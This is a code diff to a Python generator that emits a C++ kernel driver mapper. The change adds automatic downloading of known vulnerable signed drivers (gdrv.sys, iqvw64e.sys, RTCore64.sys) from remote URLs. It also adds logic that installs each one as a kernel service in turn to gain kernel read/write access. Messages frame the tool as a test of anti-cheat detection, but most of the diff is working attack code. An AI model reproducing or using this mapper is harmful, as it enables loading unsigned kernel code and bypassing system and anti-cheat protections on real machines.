@@ -50,10 +50,14 @@ class MapperGenerator:
         return """#pragma once
 
 #include <Windows.h>
+#include <wininet.h>
 #include <iostream>
 #include <vector>
 #include <string>
 #include <fstream>
+#include <map>
+
+#pragma comment(lib, "wininet.lib")
 
 // Console colors
 #define COLOR_RESET   "\\033[0m"
@@ -70,6 +74,20 @@ class MapperGenerator:
 #define LOG_ERROR(msg)   std::cout << COLOR_RED     << "[✗] " << msg << COLOR_RESET << std::endl
 #define LOG_WARNING(msg) std::cout << COLOR_YELLOW  << "[!] " << msg << COLOR_RESET << std::endl
 #define LOG_DEBUG(msg)   std::cout << COLOR_MAGENTA << "[*] " << msg << COLOR_RESET << std::endl
+
+// Driver downloader
+namespace DriverDownloader {
+    struct DriverInfo {
+        std::string filename;
+        std::string url;
+        std::string description;
+    };
+
+    bool DownloadFile(const std::string& url, const std::string& outputPath);
+    bool DownloadAllDrivers();
+    std::vector<DriverInfo> GetDriverList();
+    bool LoadConfig();
+}
 
 // Vulnerable driver interface
 namespace VulnDriver {
@@ -128,10 +146,23 @@ namespace Utils {
 
 namespace VulnDriver {
 
-// Intel iqvw64e.sys style vulnerable driver
+// Vulnerable driver info
+struct DriverInfo {
+    const char* name;
+    const char* filename;
+    const char* deviceName;
+    const char* description;
+};
+
+// Supported vulnerable drivers (tries in order)
+static DriverInfo g_supportedDrivers[] = {
+    {"gdrv", "gdrv.sys", "\\\\\\\\.\\\\GDrv", "Gigabyte - works on AMD/Intel (recommended)"},
+    {"iqvw64e", "iqvw64e.sys", "\\\\\\\\.\\\\Nal", "Intel - works on AMD/Intel"},
+    {"RTCore64", "RTCore64.sys", "\\\\\\\\.\\\\RTCore64", "MSI Afterburner - works on AMD/Intel"}
+};
+
 static HANDLE g_DriverHandle = INVALID_HANDLE_VALUE;
-static const char* DRIVER_NAME = "iqvw64e";
-static const char* DEVICE_NAME = "\\\\\\\\.\\\\Nal";
+static DriverInfo* g_ActiveDriver = nullptr;
 
 // IOCTL codes for vulnerable driver
 #define IOCTL_READ_MEMORY  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -150,71 +181,99 @@ struct MEMORY_OPERATION {
 
 bool LoadVulnerableDriver() {
     LOG_INFO("Loading vulnerable driver for kernel access...");
+    std::cout << std::endl;
 
-    // Try to open existing driver device
-    g_DriverHandle = CreateFileA(
-        DEVICE_NAME,
-        GENERIC_READ | GENERIC_WRITE,
-        0,
-        NULL,
-        OPEN_EXISTING,
-        FILE_ATTRIBUTE_NORMAL,
-        NULL
-    );
+    // Try each supported driver in order
+    for (size_t i = 0; i < sizeof(g_supportedDrivers) / sizeof(DriverInfo); i++) {
+        DriverInfo& driver = g_supportedDrivers[i];
 
-    if (g_DriverHandle == INVALID_HANDLE_VALUE) {
-        LOG_WARNING("Driver device not found, attempting to load driver...");
+        LOG_INFO("Trying: " << driver.filename);
+        LOG_DEBUG("  " << driver.description);
 
-        // Load the vulnerable driver
-        SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-        if (!scManager) {
-            LOG_ERROR("Failed to open SC Manager");
-            return false;
+        // Check if driver file exists
+        std::string driverPath = "vulnerable_drivers\\\\" + std::string(driver.filename);
+        std::ifstream test(driverPath);
+        if (!test.good()) {
+            LOG_WARNING("  Driver file not found, skipping...");
+            std::cout << std::endl;
+            continue;
         }
+        test.close();
 
-        SC_HANDLE scService = CreateServiceA(
-            scManager,
-            DRIVER_NAME,
-            DRIVER_NAME,
-            SERVICE_ALL_ACCESS,
-            SERVICE_KERNEL_DRIVER,
-            SERVICE_DEMAND_START,
-            SERVICE_ERROR_IGNORE,
-            "vulnerable_drivers\\\\iqvw64e.sys",
-            NULL, NULL, NULL, NULL, NULL
+        // Try to open existing driver device
+        g_DriverHandle = CreateFileA(
+            driver.deviceName,
+            GENERIC_READ | GENERIC_WRITE,
+            0,
+            NULL,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL
         );
 
-        if (!scService) {
-            scService = OpenServiceA(scManager, DRIVER_NAME, SERVICE_ALL_ACCESS);
-        }
+        if (g_DriverHandle == INVALID_HANDLE_VALUE) {
+            LOG_DEBUG("  Device not found, attempting to load...");
 
-        if (scService) {
-            SERVICE_STATUS status;
-            StartServiceA(scService, 0, NULL);
-            Sleep(500);
+            // Load the vulnerable driver
+            SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+            if (!scManager) {
+                LOG_ERROR("  Failed to open SC Manager (run as Administrator!)");
+                std::cout << std::endl;
+                continue;
+            }
 
-            g_DriverHandle = CreateFileA(
-                DEVICE_NAME,
-                GENERIC_READ | GENERIC_WRITE,
-                0, NULL,
-                OPEN_EXISTING,
-                FILE_ATTRIBUTE_NORMAL,
-                NULL
+            SC_HANDLE scService = CreateServiceA(
+                scManager,
+                driver.name,
+                driver.name,
+                SERVICE_ALL_ACCESS,
+                SERVICE_KERNEL_DRIVER,
+                SERVICE_DEMAND_START,
+                SERVICE_ERROR_IGNORE,
+                driverPath.c_str(),
+                NULL, NULL, NULL, NULL, NULL
             );
 
-            CloseServiceHandle(scService);
+            if (!scService) {
+                scService = OpenServiceA(scManager, driver.name, SERVICE_ALL_ACCESS);
+            }
+
+            if (scService) {
+                SERVICE_STATUS status;
+                StartServiceA(scService, 0, NULL);
+                Sleep(500);
+
+                g_DriverHandle = CreateFileA(
+                    driver.deviceName,
+                    GENERIC_READ | GENERIC_WRITE,
+                    0, NULL,
+                    OPEN_EXISTING,
+                    FILE_ATTRIBUTE_NORMAL,
+                    NULL
+                );
+
+                CloseServiceHandle(scService);
+            }
+
+            CloseServiceHandle(scManager);
         }
 
-        CloseServiceHandle(scManager);
+        if (g_DriverHandle != INVALID_HANDLE_VALUE) {
+            g_ActiveDriver = &driver;
+            std::cout << std::endl;
+            LOG_SUCCESS("✓ Loaded: " << driver.filename);
+            LOG_SUCCESS("Kernel R/W access acquired!");
+            LOG_WARNING("Your anti-cheat should have detected this!");
+            std::cout << std::endl;
+            return true;
+        }
+
+        LOG_WARNING("  Failed to load, trying next...");
+        std::cout << std::endl;
     }
 
-    if (g_DriverHandle != INVALID_HANDLE_VALUE) {
-        LOG_SUCCESS("Vulnerable driver loaded - kernel R/W access acquired!");
-        LOG_WARNING("Your anti-cheat should have detected this!");
-        return true;
-    }
-
-    LOG_ERROR("Failed to load vulnerable driver");
+    LOG_ERROR("Failed to load any vulnerable driver");
+    LOG_INFO("Available drivers: gdrv.sys, iqvw64e.sys, RTCore64.sys");
     return false;
 }
 
@@ -224,16 +283,19 @@ bool UnloadVulnerableDriver() {
         g_DriverHandle = INVALID_HANDLE_VALUE;
     }
 
-    SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (scManager) {
-        SC_HANDLE scService = OpenServiceA(scManager, DRIVER_NAME, SERVICE_ALL_ACCESS);
-        if (scService) {
-            SERVICE_STATUS status;
-            ControlService(scService, SERVICE_CONTROL_STOP, &status);
-            DeleteService(scService);
-            CloseServiceHandle(scService);
+    if (g_ActiveDriver) {
+        SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+        if (scManager) {
+            SC_HANDLE scService = OpenServiceA(scManager, g_ActiveDriver->name, SERVICE_ALL_ACCESS);
+            if (scService) {
+                SERVICE_STATUS status;
+                ControlService(scService, SERVICE_CONTROL_STOP, &status);
+                DeleteService(scService);
+                CloseServiceHandle(scService);
+            }
+            CloseServiceHandle(scManager);
         }
-        CloseServiceHandle(scManager);
+        g_ActiveDriver = nullptr;
     }
 
     LOG_INFO("Vulnerable driver unloaded");
@@ -910,6 +972,194 @@ UINT64 GetKernelExport(UINT64 moduleBase, const std::string& exportName) {
 } // namespace Utils
 """
 
+    def generate_downloader_source(self) -> str:
+        """Generate driver downloader implementation"""
+        return """#include "mapper.h"
+#include <shlobj.h>
+#include <filesystem>
+
+namespace fs = std::filesystem;
+
+namespace DriverDownloader {
+
+// Default driver URLs (can be customized in drivers_config.txt)
+static std::map<std::string, DriverInfo> g_driverList = {
+    {"gdrv.sys", {
+        "gdrv.sys",
+        "https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/raw/master/Driver/Bin/gdrv.sys",
+        "Gigabyte driver - works on AMD/Intel (most popular)"
+    }},
+    {"iqvw64e.sys", {
+        "iqvw64e.sys",
+        "https://github.com/TheCruZ/kdmapper/raw/master/kdmapper/iqvw64e.sys",
+        "Intel driver - works on AMD/Intel"
+    }},
+    {"RTCore64.sys", {
+        "RTCore64.sys",
+        "https://github.com/Aki-Hoshikawa/EyeOfRa/raw/master/EyeOfRa/Exploits/RTCore64.sys",
+        "MSI Afterburner driver - works on AMD/Intel"
+    }}
+};
+
+bool LoadConfig() {
+    std::ifstream config("drivers_config.txt");
+    if (!config.is_open()) {
+        LOG_WARNING("drivers_config.txt not found, using default URLs");
+        return false;
+    }
+
+    LOG_INFO("Loading custom driver URLs from drivers_config.txt...");
+
+    std::string line;
+    while (std::getline(config, line)) {
+        // Skip comments and empty lines
+        if (line.empty() || line[0] == '#' || line[0] == ';') {
+            continue;
+        }
+
+        // Parse: filename|url|description
+        size_t pipe1 = line.find('|');
+        size_t pipe2 = line.find('|', pipe1 + 1);
+
+        if (pipe1 != std::string::npos && pipe2 != std::string::npos) {
+            DriverInfo info;
+            info.filename = line.substr(0, pipe1);
+            info.url = line.substr(pipe1 + 1, pipe2 - pipe1 - 1);
+            info.description = line.substr(pipe2 + 1);
+
+            g_driverList[info.filename] = info;
+            LOG_DEBUG("Added driver: " << info.filename);
+        }
+    }
+
+    config.close();
+    return true;
+}
+
+std::vector<DriverInfo> GetDriverList() {
+    std::vector<DriverInfo> list;
+    for (const auto& pair : g_driverList) {
+        list.push_back(pair.second);
+    }
+    return list;
+}
+
+bool DownloadFile(const std::string& url, const std::string& outputPath) {
+    LOG_INFO("Downloading: " << url);
+
+    // Initialize WinINet
+    HINTERNET hInternet = InternetOpenA(
+        "DriverMapper/1.0",
+        INTERNET_OPEN_TYPE_DIRECT,
+        NULL,
+        NULL,
+        0
+    );
+
+    if (!hInternet) {
+        LOG_ERROR("Failed to initialize WinINet");
+        return false;
+    }
+
+    // Open URL
+    HINTERNET hUrl = InternetOpenUrlA(
+        hInternet,
+        url.c_str(),
+        NULL,
+        0,
+        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD,
+        0
+    );
+
+    if (!hUrl) {
+        LOG_ERROR("Failed to open URL");
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    // Create output file
+    std::ofstream outFile(outputPath, std::ios::binary);
+    if (!outFile.is_open()) {
+        LOG_ERROR("Failed to create output file: " << outputPath);
+        InternetCloseHandle(hUrl);
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    // Download data
+    BYTE buffer[4096];
+    DWORD bytesRead = 0;
+    DWORD totalBytes = 0;
+
+    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+        outFile.write((char*)buffer, bytesRead);
+        totalBytes += bytesRead;
+    }
+
+    outFile.close();
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hInternet);
+
+    LOG_SUCCESS("Downloaded " << totalBytes << " bytes to " << outputPath);
+    return totalBytes > 0;
+}
+
+bool DownloadAllDrivers() {
+    // Load custom config if available
+    LoadConfig();
+
+    // Create vulnerable_drivers directory
+    fs::create_directories("vulnerable_drivers");
+
+    LOG_INFO("========================================================");
+    LOG_INFO("  Downloading Vulnerable Drivers");
+    LOG_INFO("========================================================");
+    std::cout << std::endl;
+
+    bool anySuccess = false;
+    int downloaded = 0;
+    int skipped = 0;
+
+    for (const auto& pair : g_driverList) {
+        const DriverInfo& info = pair.second;
+        std::string outputPath = "vulnerable_drivers\\\\" + info.filename;
+
+        // Check if already exists
+        if (fs::exists(outputPath)) {
+            LOG_INFO("[SKIP] " << info.filename << " (already exists)");
+            skipped++;
+            continue;
+        }
+
+        LOG_INFO("Downloading: " << info.filename);
+        LOG_DEBUG("  " << info.description);
+
+        if (DownloadFile(info.url, outputPath)) {
+            LOG_SUCCESS("  ✓ " << info.filename);
+            downloaded++;
+            anySuccess = true;
+        } else {
+            LOG_ERROR("  ✗ Failed to download " << info.filename);
+        }
+
+        std::cout << std::endl;
+    }
+
+    std::cout << std::endl;
+    LOG_INFO("========================================================");
+    LOG_INFO("  Download Summary");
+    LOG_INFO("========================================================");
+    LOG_SUCCESS("Downloaded: " << downloaded << " driver(s)");
+    LOG_INFO("Skipped: " << skipped << " (already exist)");
+    LOG_INFO("Total available: " << g_driverList.size());
+    std::cout << std::endl;
+
+    return anySuccess || (skipped > 0);
+}
+
+} // namespace DriverDownloader
+"""
+
     def generate_main_source(self) -> str:
         """Generate main program with drag-and-drop interface"""
         return """#include "mapper.h"
@@ -996,6 +1246,33 @@ void PrintDetectionChecklist() {
 int main(int argc, char* argv[]) {
     PrintBanner();
 
+    // Check for vulnerable drivers, download if missing
+    namespace fs = std::filesystem;
+    bool hasDrivers = fs::exists("vulnerable_drivers/gdrv.sys") ||
+                      fs::exists("vulnerable_drivers/iqvw64e.sys") ||
+                      fs::exists("vulnerable_drivers/RTCore64.sys");
+
+    if (!hasDrivers) {
+        LOG_WARNING("No vulnerable drivers found!");
+        LOG_INFO("First run detected - downloading vulnerable drivers...");
+        std::cout << std::endl;
+
+        if (!DriverDownloader::DownloadAllDrivers()) {
+            LOG_ERROR("Failed to download vulnerable drivers");
+            LOG_INFO("You can manually download and place them in vulnerable_drivers\\\\");
+            std::cout << std::endl << "Press any key to exit...";
+            _getch();
+            return 1;
+        }
+
+        LOG_SUCCESS("Vulnerable drivers ready!");
+        std::cout << std::endl;
+        std::cout << "Press any key to continue...";
+        _getch();
+        system("cls");
+        PrintBanner();
+    }
+
     std::string driverPath;
 
     // Check if file was dragged onto the exe
@@ -1061,7 +1338,7 @@ int main(int argc, char* argv[]) {
     // Load vulnerable driver
     if (!VulnDriver::LoadVulnerableDriver()) {
         LOG_ERROR("Failed to load vulnerable driver");
-        LOG_INFO("Make sure iqvw64e.sys is in vulnerable_drivers folder");
+        LOG_INFO("Check vulnerable_drivers folder for gdrv.sys or iqvw64e.sys");
         std::cout << std::endl << "Press any key to exit...";
         _getch();
         return 1;
@@ -1114,6 +1391,7 @@ add_executable(mapper
     src/pe_parser.cpp
     src/mapper.cpp
     src/utils.cpp
+    src/downloader.cpp
 )
 
 target_include_directories(mapper PRIVATE
@@ -1124,6 +1402,7 @@ target_include_directories(mapper PRIVATE
 target_link_libraries(mapper
     ntdll
     comdlg32
+    wininet
 )
 
 # Output to build directory
@@ -1355,6 +1634,10 @@ If it doesn't → Time to improve your detection! 🛡️
             self.generate_utils_source(),
             encoding='utf-8'
         )
+        (self.output_dir / 'src' / 'downloader.cpp').write_text(
+            self.generate_downloader_source(),
+            encoding='utf-8'
+        )
         (self.output_dir / 'src' / 'main.cpp').write_text(
             self.generate_main_source(),
             encoding='utf-8'
@@ -1375,10 +1658,32 @@ If it doesn't → Time to improve your detection! 🛡️
         )
         print("[+] Generated documentation")
 
+        # Create config file for custom driver URLs
+        (self.output_dir / 'drivers_config.txt').write_text(
+            "# Vulnerable Driver Download Configuration\n"
+            "# Format: filename|url|description\n"
+            "# Lines starting with # or ; are comments\n"
+            "#\n"
+            "# Default drivers (already preset in code):\n"
+            "# gdrv.sys - Works on AMD/Intel (recommended)\n"
+            "# iqvw64e.sys - Works on AMD/Intel  \n"
+            "# RTCore64.sys - Works on AMD/Intel\n"
+            "#\n"
+            "# Add your own drivers below:\n"
+            "# example.sys|https://example.com/driver.sys|Description here\n",
+            encoding='utf-8'
+        )
+
         # Create placeholder for vulnerable driver
         (self.output_dir / 'vulnerable_drivers' / 'README.txt').write_text(
-            "Place iqvw64e.sys or similar vulnerable driver here for testing.\n"
-            "Your anti-cheat should BLOCK these drivers!\n",
+            "Vulnerable drivers will be auto-downloaded on first run!\n\n"
+            "Supported drivers:\n"
+            "  - gdrv.sys (Gigabyte - works on AMD/Intel)\n"
+            "  - iqvw64e.sys (Intel - works on AMD/Intel)\n"
+            "  - RTCore64.sys (MSI Afterburner - works on AMD/Intel)\n\n"
+            "The mapper will automatically try each driver in order.\n"
+            "Your anti-cheat should DETECT and BLOCK all of them!\n\n"
+            "To customize download URLs, edit drivers_config.txt\n",
             encoding='utf-8'
         )
 
